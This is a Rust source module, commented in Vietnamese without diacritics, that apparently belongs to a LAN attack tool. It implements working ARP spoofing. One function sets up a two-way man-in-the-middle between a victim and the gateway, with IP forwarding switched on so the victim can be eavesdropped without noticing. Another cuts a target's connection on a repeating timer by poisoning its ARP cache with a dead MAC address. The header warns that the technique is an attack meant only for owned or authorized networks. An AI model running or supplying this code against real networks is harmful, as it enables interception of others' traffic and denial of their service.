//! chen.rs — CHEN GIUA (ARP spoof / MITM) de SOI traffic thiet bi khac.
//!
//! CANH BAO ky thuat & rang gioi (ghi thang trong code de nho):
//!   - Day la ky thuat TAN CONG. CHI dung tren mang BAN SO HUU / duoc phep.
//!   - Voi HTTPS (gan het web) ban CHI thay TEN MIEN (qua DNS/SNI), KHONG thay noi dung.
//!   - No lam mang cham/de loi. Luon KHOI PHUC khi thoat, neu khong may nan nhan mat mang.
//!
//! Cach lam: noi doi ARP hai chieu —
//!   - Bao NAN NHAN: "gateway o MAC cua toi"  → goi ra Internet cua no di qua toi.
//!   - Bao GATEWAY:  "nan nhan o MAC cua toi" → goi tra ve cung di qua toi.
//! Ta bat chuyen tiep IP (ip_forward) de goi van chay → nan nhan khong dut mang.
//! Lap lai deu (cache ARP tu lam moi). Khi thoat: gui ARP DUNG de vá lai.

use crate::arp::{dong_arp_request, doc_arp_reply, dong_arp_reply};
use crate::mac::Mac;
use crate::nic::Nic;
use std::io;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

/// Resolve 1 IP → MAC bang ARP (thu vai lan). None = khong ai giu IP do (AN).
pub fn hoi_mac<N: Nic>(nic: &N, dich_ip: [u8; 4], lan: u32) -> io::Result<Option<Mac>> {
    let req = dong_arp_request(nic.mac(), nic.ipv4(), dich_ip);
    for _ in 0..lan {
        nic.gui(&req)?;
        // hut reply trong ~400ms
        let mut con = 400i64;
        while con > 0 {
            let t0 = Instant::now();
            if let Some(khung) = nic.nhan(200)? {
                if let Some(r) = doc_arp_reply(&khung) {
                    if r.ip == dich_ip {
                        return Ok(Some(r.mac));
                    }
                }
            }
            con -= t0.elapsed().as_millis() as i64;
        }
    }
    Ok(None)
}

/// Bat ip_forward cua Linux (can quyen). Tra gia tri cu de tra lai khi xong.
#[cfg(target_os = "linux")]
pub fn bat_chuyen_tiep() -> io::Result<String> {
    let cu = std::fs::read_to_string("/proc/sys/net/ipv4/ip_forward").unwrap_or_else(|_| "0".into());
    std::fs::write("/proc/sys/net/ipv4/ip_forward", "1\n")?;
    Ok(cu.trim().to_string())
}

#[cfg(target_os = "linux")]
pub fn tra_chuyen_tiep(cu: &str) {
    let _ = std::fs::write("/proc/sys/net/ipv4/ip_forward", format!("{}\n", cu));
}

pub struct MucTieu {
    pub ip: [u8; 4],
    pub mac: Mac,
}

/// Vong CHEN: lien tuc noi doi ARP cho ca nan nhan lan gateway.
/// `dang_chay` = co Ctrl-C ha xuong thi dung. Khi ra khoi vong → khoi phuc.
pub fn chen_giua<N: Nic>(
    nic: &N,
    nan_nhan: &MucTieu,
    gateway: &MucTieu,
    dang_chay: Arc<AtomicBool>,
) -> io::Result<()> {
    let toi = nic.mac();

    // Goi noi doi:
    //  - toi nan_nhan: "IP gateway = MAC toi"
    let doi_nan = dong_arp_reply(toi, gateway.ip, nan_nhan.mac, nan_nhan.ip);
    //  - toi gateway: "IP nan_nhan = MAC toi"
    let doi_gw = dong_arp_reply(toi, nan_nhan.ip, gateway.mac, gateway.ip);

    eprintln!(
        "[chen] bat dau: nan nhan {} <=> gateway {} (Ctrl-C de dung & va lai)",
        ip_str(nan_nhan.ip),
        ip_str(gateway.ip)
    );

    while dang_chay.load(Ordering::SeqCst) {
        let _ = nic.gui(&doi_nan);
        let _ = nic.gui(&doi_gw);
        // 2 giay/nhip: du de dam cache, khong lam nghen mang.
        let het = Instant::now() + Duration::from_secs(2);
        while Instant::now() < het && dang_chay.load(Ordering::SeqCst) {
            std::thread::sleep(Duration::from_millis(200));
        }
    }

    // ===== KHOI PHUC: gui ARP DUNG vai lan cho ca hai ben =====
    eprintln!("[chen] dung — dang va lai ARP that cho hai ben...");
    let sua_nan = dong_arp_reply(gateway.mac, gateway.ip, nan_nhan.mac, nan_nhan.ip);
    let sua_gw = dong_arp_reply(nan_nhan.mac, nan_nhan.ip, gateway.mac, gateway.ip);
    for _ in 0..5 {
        let _ = nic.gui(&sua_nan);
        let _ = nic.gui(&sua_gw);
        std::thread::sleep(Duration::from_millis(200));
    }
    eprintln!("[chen] xong. Mang tra ve binh thuong.");
    Ok(())
}

pub fn ip_str(ip: [u8; 4]) -> String {
    format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3])
}

/// NGAT NHIP: cho `muc_tieu` dung mang `phut_cho` phut, roi CAT `giay_ngat` giay, lap mai.
/// Cach cat: ho tang ARP — bao muc_tieu rang gateway o MAC chet → goi ra Internet roi vao ho den.
/// Khi cho phep lai: gui ARP DUNG (gateway that) de muc_tieu phuc hoi ngay.
pub fn ngat_nhip<N: Nic>(
    nic: &N,
    muc_tieu: &MucTieu,
    gateway: &MucTieu,
    phut_cho: u64,
    giay_ngat: u64,
    dang_chay: Arc<AtomicBool>,
) -> io::Result<()> {
    let toi = nic.mac();
    let mac_chet = Mac([0xde, 0xad, 0x00, 0x00, 0x00, 0x01]);
    // ARP CAT: sender = MAC chet, bao IP gateway → muc_tieu tuong gateway o cho chet.
    let arp_cat = dong_arp_reply(mac_chet, gateway.ip, muc_tieu.mac, muc_tieu.ip);
    // ARP LANH: sender = MAC that cua gateway → muc_tieu phuc hoi dung.
    let arp_lanh = dong_arp_reply(gateway.mac, gateway.ip, muc_tieu.mac, muc_tieu.ip);
    let _ = toi;

    eprintln!(
        "[ngat] {} duoc dung {} phut roi bi cat {} giay — lap lai. (Ctrl-C de dung & tra lai mang)",
        ip_str(muc_tieu.ip),
        phut_cho,
        giay_ngat
    );

    while dang_chay.load(Ordering::SeqCst) {
        // --- PHA CHO PHEP ---
        for _ in 0..3 {
            let _ = nic.gui(&arp_lanh);
        }
        eprintln!("[ngat] cho phep {} dung mang {} phut...", ip_str(muc_tieu.ip), phut_cho);
        if !ngu_nhay(phut_cho * 60, &dang_chay) {
            break;
        }
        // --- PHA CAT ---
        eprintln!("[ngat] >>> CAT mang {} trong {} giay <<<", ip_str(muc_tieu.ip), giay_ngat);
        let het = Instant::now() + Duration::from_secs(giay_ngat);
        while Instant::now() < het && dang_chay.load(Ordering::SeqCst) {
            let _ = nic.gui(&arp_cat); // dam lien tuc de cache khong tu lanh
            std::thread::sleep(Duration::from_millis(800));
        }
    }

    // Ra khoi vong: tra lai mang cho muc_tieu.
    eprintln!("[ngat] dung — tra lai mang cho {}...", ip_str(muc_tieu.ip));
    for _ in 0..6 {
        let _ = nic.gui(&arp_lanh);
        std::thread::sleep(Duration::from_millis(200));
    }
    eprintln!("[ngat] xong.");
    Ok(())
}

/// Ngu `giay` giay nhung kiem co dung moi 200ms. Tra false neu bi ngat giua chung.
fn ngu_nhay(giay: u64, dang_chay: &Arc<AtomicBool>) -> bool {
    let het = Instant::now() + Duration::from_secs(giay);
    while Instant::now() < het {
        if !dang_chay.load(Ordering::SeqCst) {
            return false;
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    true
}

/// Co dung toan cuc — signal handler khong capture bien nen phai dung static.
static CO_DUNG: AtomicBool = AtomicBool::new(true);

#[cfg(target_os = "linux")]
extern "C" fn xu_ly_dung(_sig: libc::c_int) {
    CO_DUNG.store(false, Ordering::SeqCst);
}

/// Cai bay Ctrl-C (SIGINT/SIGTERM). Tra ve co `dang_chay` de vong `chen_giua` doc.
#[cfg(target_os = "linux")]
pub fn bay_dung() -> Arc<AtomicBool> {
    unsafe {
        libc::signal(libc::SIGINT, xu_ly_dung as *const () as libc::sighandler_t);
        libc::signal(libc::SIGTERM, xu_ly_dung as *const () as libc::sighandler_t);
    }
    // Bo goi mong: dong bo tu static sang Arc bang mot luong nho.
    let co = Arc::new(AtomicBool::new(true));
    let co2 = co.clone();
    std::thread::spawn(move || loop {
        if !CO_DUNG.load(Ordering::SeqCst) {
            co2.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(Duration::from_millis(100));
    });
    co
}
